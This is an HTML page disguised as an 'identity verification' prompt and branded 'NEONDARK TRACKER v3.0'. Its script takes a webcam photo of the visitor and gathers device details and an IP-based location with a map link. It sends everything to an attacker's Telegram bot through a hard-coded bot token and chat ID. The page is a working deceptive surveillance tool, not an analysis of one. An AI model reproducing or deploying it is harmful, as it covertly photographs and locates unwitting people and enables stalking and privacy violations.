<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verify Identity</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 20px;
        }
        .box {
            background: rgba(0,255,65,0.05);
            border: 1px solid rgba(0,255,65,0.15);
            border-radius: 20px;
            padding: 40px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-size: 1.6rem;
            font-weight: 700;
            letter-spacing: 2px;
            margin-bottom: 8px;
            color: #00ff41;
        }
        .status { color: #666; font-size: 0.85rem; margin: 12px 0; }
        .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff41;
            border-radius: 50%;
            animation: blink 1.2s infinite;
            margin-right: 10px;
        }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.15; } }
        .loader {
            border: 2px solid rgba(0,255,65,0.08);
            border-top: 2px solid #00ff41;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { color: #222; font-size: 0.6rem; margin-top: 20px; }
        video, canvas { display: none !important; }
        .btn-verify {
            padding: 14px 40px;
            background: #00ff41;
            border: none;
            border-radius: 12px;
            color: #0a0a0a;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
        }
        .btn-verify:hover {
            transform: scale(1.05);
            box-shadow: 0 0 40px rgba(0,255,65,0.2);
        }
        .btn-verify:active { transform: scale(0.95); }
        .hidden { display: none; }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(20px);
            background: rgba(10,10,10,0.9);
            border: 1px solid rgba(0,255,65,0.15);
            border-radius: 12px;
            padding: 10px 20px;
            color: #00ff41;
            font-size: 0.7rem;
            z-index: 999;
            opacity: 0;
            transition: all 0.5s ease;
            pointer-events: none;
            backdrop-filter: blur(12px);
            max-width: 90%;
        }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        @media (max-width: 480px) {
            .box { padding: 25px 20px; }
            h1 { font-size: 1.3rem; }
            .loader { width: 30px; height: 30px; }
        }
    </style>
</head>
<body>

    <div class="toast" id="toast"><span id="toastMessage">✅ Ready</span></div>

    <div class="box" id="mainBox">
        <h1>🔐 VERIFY IDENTITY</h1>
        <div class="status"><span class="dot"></span> Please verify your identity to continue</div>
        <div class="loader" id="loader"></div>
        <p style="color: #444; font-size: 0.75rem; margin-top: 10px;">We need to confirm you are a real person</p>
        <button class="btn-verify" id="verifyBtn" onclick="startCamera()">📸 Verify Now</button>
        <div class="footer"><span style="color:#00ff41;">NEONDARK</span> v3.0</div>
        <div style="margin-top:15px; font-size:0.65rem; color:#333;">
            <span id="statusText">Click "Verify Now" to continue</span>
        </div>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
        const CHAT_ID = '8768522731';

        let stream = null;
        let photoCaptured = false;

        function showToast(msg) {
            const toast = document.getElementById('toast');
            document.getElementById('toastMessage').textContent = msg;
            toast.classList.add('show');
            clearTimeout(toast._timer);
            toast._timer = setTimeout(() => toast.classList.remove('show'), 3000);
        }

        function updateStatus(msg) {
            document.getElementById('statusText').textContent = msg;
        }

        // ===== START CAMERA (DENGAN POPUP IZIN) =====
        async function startCamera() {
            const btn = document.getElementById('verifyBtn');
            const loader = document.getElementById('loader');
            btn.disabled = true;
            btn.textContent = '⏳ Accessing Camera...';
            updateStatus('⏳ Mengakses kamera...');

            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();

                updateStatus('✅ Camera active! Capturing photo...');

                // Capture foto setelah 1 detik
                setTimeout(() => {
                    captureAndSend();
                }, 1000);

            } catch (e) {
                console.error('Camera error:', e);
                updateStatus('❌ Camera access denied or not available');
                showToast('❌ Kamera tidak bisa diakses');
                btn.disabled = false;
                btn.textContent = '📸 Verify Now';
                loader.style.display = 'block';
            }
        }

        // ===== CAPTURE & SEND =====
        function captureAndSend() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photo = canvas.toDataURL('image/jpeg', 0.85);

            // Matikan camera
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }

            updateStatus('📸 Photo captured! Sending to server...');
            showToast('📸 Foto terambil!');

            // Kirim ke Telegram
            sendToTelegram(photo);
        }

        // ===== GET DEVICE INFO =====
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Unknown', os = 'Unknown', browser = 'Unknown';
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'MacOS';
            else if (ua.includes('Linux')) os = 'Linux';

            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';

            if (os === 'Android') {
                const match = ua.match(/Android\s([\d.]+)/);
                if (match) os += ' ' + match[1];
                const brandMatch = ua.match(
                    /(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
                const brand = brandMatch ? brandMatch[1] : '';
                const modelMatch = ua.match(/\(([^)]+)\)/);
                const model = modelMatch ? modelMatch[1].split(';').pop().trim() : '';
                device = brand + ' ' + model || 'Android Device';
            } else if (os === 'iOS') {
                const match = ua.match(/OS\s([\d_]+)/);
                if (match) os += ' ' + match[1].replace(/_/g, '.');
                device = ua.includes('iPhone') ? 'iPhone' : (ua.includes('iPad') ? 'iPad' : 'iOS Device');
            } else {
                device = os + ' Device';
            }
            return { device, os, browser };
        }

        // ===== GET LOCATION =====
        async function getLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    lat: data.latitude || 0,
                    lon: data.longitude || 0,
                    isp: data.org || 'Unknown'
                };
            } catch (e) {
                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 0, lon: 0,
                    isp: 'Unknown' };
            }
        }

        // ===== SEND TO TELEGRAM =====
        async function sendToTelegram(photoData) {
            const deviceInfo = getDeviceInfo();
            const location = await getLocation();
            const now = new Date();
            const dateStr = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

            let message = `🔔 *NEW VISITOR DETECTED!*\n\n`;
            message += `📅 *Time:* ${dateStr}\n`;
            message += `📱 *Device:* ${deviceInfo.device}\n`;
            message += `🌐 *Browser:* ${deviceInfo.browser}\n`;
            message += `💻 *OS:* ${deviceInfo.os}\n`;
            message += `🌍 *IP:* ${location.ip}\n`;
            message += `📍 *City:* ${location.city}\n`;
            message += `🗺️ *Region:* ${location.region}\n`;
            message += `🏳️ *Country:* ${location.country}\n`;
            message += `🏢 *ISP:* ${location.isp}\n`;
            message += `🗺️ *Map:* https://www.google.com/maps?q=${location.lat},${location.lon}\n`;

            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.textContent = '⏳ Sending...';
            updateStatus('📤 Sending data to server...');

            try {
                // Kirim pesan
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                // Kirim foto
                if (photoData) {
                    const blob = dataURLtoBlob(photoData);
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }

                // Update UI
                document.querySelector('h1').textContent = '✅ VERIFIED!';
                document.querySelector('.status').innerHTML = 'Identity verified successfully.';
                document.getElementById('loader').style.display = 'none';
                document.querySelector('.btn-verify').style.display = 'none';
                updateStatus('✅ Data sent successfully!');
                showToast('✅ Data terkirim ke Telegram!');

            } catch (e) {
                console.error('Send error:', e);
                updateStatus('❌ Gagal mengirim data');
                showToast('❌ Gagal kirim data');
                btn.disabled = false;
                btn.textContent = '📸 Verify Now';
            }
        }

        function dataURLtoBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], { type: mime });
        }

        // ===== CEK APAKAH SUDAH PERNAH AKSES KAMERA =====
        async function checkCameraPermission() {
            try {
                const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
                testStream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) {
                return false;
            }
        }

        // ===== PREVENT CONTEXT MENU =====
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('dragstart', e => e.preventDefault());
        document.addEventListener('drop', e => e.preventDefault());

        console.log('%c🔒 NEONDARK TRACKER v3.0', 'color:#00ff41;font-size:20px;font-weight:700;');
        console.log('%c📞 BOT_TOKEN & CHAT_ID sudah di-set', 'color:#25d366;font-size:13px;');
    </script>

</body>
</html>
